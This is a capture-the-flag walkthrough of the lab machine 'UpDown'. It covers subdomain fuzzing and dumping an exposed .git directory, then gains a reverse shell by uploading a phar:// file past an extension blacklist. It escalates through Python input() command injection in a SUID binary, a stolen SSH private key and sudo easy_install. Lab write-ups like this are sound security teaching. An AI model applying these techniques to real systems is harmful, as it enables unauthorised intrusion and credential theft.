```

I went to the website and added the hostname to `/etc/hosts`:

![](../../../assets/136317817782d0891d0a90f5cd354273.png)

And then I went ahead and started looking for subdomains and subdirectories since there was nothing notable on the site. I used `ffuf` to locate any subdomains which initially responded with false positives:

![](../../../assets/01825017352a4245671c093ce2fef508.png)

So I then went ahead and `excluded` all the responses with size `1131`:

```bash
ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131
```

![](../../../assets/4caa90f9f947caf7d729d6edff2ae1dd.png)

After successfully fuzzing a new subdomain I added it to my `/etc/hosts` list again: 

```bash
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```


## 80/TCP - HTTP

After having successfully added the subdomain I tried to visit the site, yet I ran into a problem:

![](../../../assets/4832fef8e3c51154033d7511f28b2acf.png)

Which makes sense as the output from `ffuf` showed us the same `403` response. Time to enumerate further using `gobuster`:

![](../../../assets/154b5c07c49f807ee5e40b27d5c188e9.png)

But when we visit `/dev` it is just an empty page:

![](../../../assets/fb1146dcbe35eea7d14a86cac5e636af.png)

So I went ahead and ran `gobuster` again on the `/dev` endpoint this time:

![](../../../assets/fbaba59e867cd5e61fe3025457657d8b.png)

It looks like there is an exposed `.git` endpoint, I decided to check it out using `curl`:

![](../../../assets/8d1507dd5af81545c453916595df1bcc.png)


==Git-Dumper==
Apparently a tool called `git-dumper` exists with which you can go ahead and dump entire `git` repositories if they are exposed.
I installed it using `pip install git-dumper` as per the [official repo instructions](https://github.com/arthaud/git-dumper).

Running this tool gave me the following output:

![](../../../assets/3c6b96e7fb2235b206461a32132db3b0.png)

I then went inside the new `dev` directory I just created and checked the directory using `ls -la`:

![](../../../assets/72409b2f4546e858e69e09bbb0da1dfd.png)

I found the `.htaccess` file which usually contains `Apache` web server configs:

![](../../../assets/5dc1bf87463f368ed4e446869c6a647c.png)
https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file

I used `cat` on the file and read it:

![](../../../assets/b116bbd78925e6742075167ffdea480c.png)

Since I need to specify the header on every request I will instead automate this using `Burp`
I have to go to the `Proxy` settings -> `Match and replace rules` -> `Add` and enter a new set of rules:

![](../../../assets/8fddd79c154bfd43e1d0abbec24db985.png)

![](../../../assets/a63eaaeb760c6a6b40e5d5d473679d4a.png)


==dev subdomain==
After adding these rules I visit the main page again and I am greeted with the new dashboard:

![](../../../assets/621534094194150582d8cdb7af8473c8.png)

I created a sample list of sites to view the behavior:

![](../../../assets/1f53fe18d9641b6d83a5f63116738a4b.png)

And I uploaded it to the website:

![](../../../assets/1002a4ca17aae46a781f85b1ae1eee6d.png)

I got the following response:

![](../../../assets/618298f309b9b72c50443845b6fc2ce6.png)

It is unclear to me what the 4th check is and why it popped up so I decided to check the source code, which was in the `dev git dump` folder.

```php
# Admin.php

<?php
if(DIRECTACCESS){
        die("Access Denied");
}

#ToDo
?>
```

The above appears to show a `DIRECTACCESS` function that we can find in the `index.php` file.

```php
# Index.php

<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```

The `index.php` file appears to check for the inclusion of `$_GET['page']` which prevents us from accessing the specified directories, and if the `GET` parameter is not supplied it will include the `checker.php` file. This was a quite extensive file but the following is the most important part:

```php
# Checker.php

if($_POST['check']){
  
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
        $file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
  
        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));

        foreach($websites as $site){
                $site=trim($site);
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }

  # Delete the uploaded file.
        @unlink($final_path);
}
```

We notice that there has been a valiant attempt at stopping certain file extensions to be uploaded. Furthermore it appears that the file get's uploaded to a `/uploads/` endpoint and after the check has been completed the file get's automatically deleted.

>Note: This approach of individually blacklisting certain extension is NOT desired since there are still certain extensions which can be packaged and uploaded. It is far better to `WHITELIST` certain extensions instead!


==file upload==
After looking up under what alternative we could upload a `web-shell` I stumbled upon the following:

![](../../../assets/2f6adc8fba975e2567d9424329d65b38.png)
https://pecl.php.net/package-search.php?pkg_name=phar 

I went ahead and created a zipped up file which I would then go ahead and unwrap using the `phar://` `php wrapper`.

![](../../../assets/b0e509fc5cb5698762677ea69e3aa42a.png)

I uploaded the file and went into the `/uploads` endpoint to view whether it was uploaded correctly.

![](../../../assets/60c84b71ae4302f2ed2eed4666d3accb.png)

Since the file was there inside the folder I used the following `URL` to view the contents:

```bash
http://dev.siteisup.htb/?page=phar://uploads/04ffd93eb78f31fa555193717bc23cf1/info.txt/info
```

![](../../../assets/87d551fb540dc01dc73001b18ad5f7f1.png)

This proved that the file upload was indeed vulnerable to the `phar://` wrapper. I now skimmed the output in order to understand what sort of payload I could upload.

Unfortunately enough I found multiple functions to be disabled which meant improvising:

![](../../../assets/2344316e062ce8bf9e987cb9d810aea8.png)

Fortunately for me though I found the following tool in a blog that could help me bypass this problem:

![](../../../assets/0c20a7945d503328f150892d1b85781b.png)


![](../../../assets/3ed9cefc915c1c32baa3c597ec9fdd59.png)
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass

![](../../../assets/d9fe1e1048f7577ae6b15e7a9499cdb9.png)
https://github.com/teambi0s/dfunc-bypasser

I followed the `git clone` command and installed the tool after which I used it with `python2` (`python` or `python3` does NOT work!)

![](../../../assets/4462a732cf843708ce8db5ea3f242510.png)

I ran into some trouble at first so I had to reupload the file again:

==fail==
![](../../../assets/b77a87420cf4cc8e8097d6c87da4558d.png)

==pass==
![](../../../assets/942ecb16cfe9c320283468510a624325.png)

It seems I need to use the `proc_open()` function according to the script. Since I had no clue how to use it I searched it up and found the following:

![](../../../assets/09b5373c7200e9551ab83d6e81350bf9.png)
https://www.php.net/manual/en/function.proc-open.php

I now had to craft a reverse-shell using the `proc_open()` function.


==crafting web shell==
I went ahead and googled for `proc_open reverse shell` which led me to the following `GitHub`
page:

![](../../../assets/79f2066fb84908654eb76219172332a3.png)
https://github.com/jbarcia/Web-Shells/blob/master/laudanum/php/php-reverse-shell.php

I then went ahead and wrapped this around `<?php` tags as well as tweaked it a little bit:

![](../../../assets/db4d6148be46ca63ae469b046e5d181f.png)

I then went ahead and zipped it up just like previously:

![](../../../assets/e6afd130ef8d02eead0ff17b703b0828.png)

Now I went ahead and uploaded the file again:

![](../../../assets/96227b9049cfc71da8dfafe824b3dcc9.png)

I started up my listener at `1234` and went to the `URL`:

![](../../../assets/46e0b7a8981f7288d68f89bb5e42cd2d.png)


==www-data shell==
And just like that I got the `www-data` shell:

![](../../../assets/13396bfe7c99132b3c4b7f472a71b037.png)

I then went ahead and created a `shell-ception` in case I accidently `Ctrl + C` the shell:

![](../../../assets/46cf383517169009e276ab65a8ab9939.png)

I stabilized that shell using the following commands:

![](../../../assets/c0a5963fb31d7db7a34726faadd0e1de.png)

I found nothing useful inside the directory I landed in (since I have already searched it previously) thus went to the `/` directory. Afterwards I `cd` into `/home` where I found the `developer` user. Inside his directory was the `user.txt` flag which I did not have permissions for but there was another `dev` directory as well:

![](../../../assets/d8af52099b29052511e155065124101d.png)

The `SUID` bit set is set for the `developer` on both files which means we can perhaps use this to our advantage.

![](../../../assets/c8b72cc2c2e0da9d807c41310e06d894.png)

From the `print` function we can tell that it is a `Python2` script. I tried to inject malicious commands since the `input` parameter does not properly sanitize it:

![](../../../assets/c926e7b779de508fa25860fa78ea8ab5.png)

And when I run the same on the binary I see the following:

![](../../../assets/22762e565b29c65b4980caf859b27a94.png)


==developer shell==
I see it returned `developer` instead, thus it runs under that user. Meaning I just needed to change the command from `whoami` to `bash` in this case for the binary to grant me a shell under this user:

```bash
__import__('os').system('bash')
```

![](../../../assets/f0fcee723e07da4eb93cd4423e557eff.png)

I was right! Just like that we have elevated our privileges and I got the user flag... or not since it is still owned by `root` :(

Thus I had to get creative. I `ls -la` the `/home` directory of `developer` and found `authorized_keys` as well as `id_rsa.pub`. I checked if they matched and luckily for me they did:

![](../../../assets/1b9253120e616ea48c157ffcd67e6b00.png)

This meant that the `private key` should suffice to log into `SSH`.
I used `cat` on `id_rsa`:

```bash
developer@updown:/home/developer/.ssh$ cat id_rsa

-----END OPENSSH PRIVATE KEY-----
developer@updown:/home/developer/.ssh$
```


==user.txt==
And then on my local machine I put the `private key` into a new file, change permissions and `ssh'd` into the machine:

```bash
┌──(kali㉿kali)-[~]
└─$ cat > dev-key  

┌──(kali㉿kali)-[~]
└─$ chmod 600 dev-key

┌──(kali㉿kali)-[~]
└─$ ssh -i dev-key developer@siteisup.htb

Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
developer@updown:~$ 
```

This way I could actually go ahead and `cat` the `user.txt` flag:

## Privilege Escalation

In order to escalate privileges I started off by using `sudo -l`:

![](../../../assets/8b83e1750331cb1adb40cc71d558e40c.png)

It appears I can run a binary without a password, let's check it out:

```bash
developer@updown:~$ cat /usr/local/bin/easy_install
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

By looking `easy_install` up on [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/) I found the way to exploit it:

![](../../../assets/28b5159057cb71eac4e907195f3ec1ba.png)

We need to essentially create a new directory, and leverage that directory to create a `root` shell by spawning it through the use of the `easy_install` script:

![](../../../assets/7d7b48840c82bac4b85f64b23904dda2.png)


==root.txt==
Straightforward:
